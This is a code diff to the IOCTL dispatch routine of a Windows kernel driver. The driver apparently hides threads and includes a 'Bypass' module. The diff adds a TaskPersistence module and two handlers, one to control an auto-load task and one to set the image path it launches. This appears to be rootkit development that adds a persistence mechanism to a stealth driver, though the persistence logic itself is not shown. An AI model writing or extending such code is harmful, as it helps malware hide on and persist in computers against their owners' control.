@@ -1,6 +1,7 @@
 #include "Dispatch.h"
 #include "ProcessModule.h"
 #include "ThreadModule.h"
+#include "TaskPersistence.h"
 #include "Bypass.h"
 #include "Shared.h"
 #include <ntddk.h>
@@ -179,6 +180,35 @@ NTSTATUS DispatchDeviceControl(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
     if (outputLength == sizeof(THREAD_LIST_RESPONSE)) {
       status = ThreadListHidden((PTHREAD_LIST_RESPONSE)outputBuffer);
       bytesReturned = sizeof(THREAD_LIST_RESPONSE);
+    } else {
+      status = STATUS_INVALID_BUFFER_SIZE;
+    }
+    break;
+
+  // ------------------------------------------------------
+  // Auto-load task control (see TaskPersistence.c)
+  // ------------------------------------------------------
+  case IOCTL_TASK_CONTROL:
+    DbgPrint("TASK_CONTROL requested.\n");
+    if (inputLength == sizeof(TASK_REQUEST) &&
+        outputLength >= sizeof(DRIVER_RESPONSE)) {
+      PTASK_REQUEST req = (PTASK_REQUEST)inputBuffer;
+      PDRIVER_RESPONSE response = (PDRIVER_RESPONSE)outputBuffer;
+      response->Status =
+          TaskPersistenceControl(req->Operation, &response->Data);
+      bytesReturned = sizeof(DRIVER_RESPONSE);
+      // IRP status stays STATUS_SUCCESS so the client can read the response.
+    } else {
+      status = STATUS_INVALID_BUFFER_SIZE;
+    }
+    break;
+
+  case IOCTL_TASK_SET_IMAGE_PATH:
+    DbgPrint("TASK_SET_IMAGE_PATH requested.\n");
+    if (inputLength >= sizeof(WCHAR) && inputLength / sizeof(WCHAR) < 512) {
+      status = TaskPersistenceSetImagePath((PWCHAR)inputBuffer,
+                                           inputLength / sizeof(WCHAR));
+      bytesReturned = 0;
     } else {
       status = STATUS_INVALID_BUFFER_SIZE;
     }
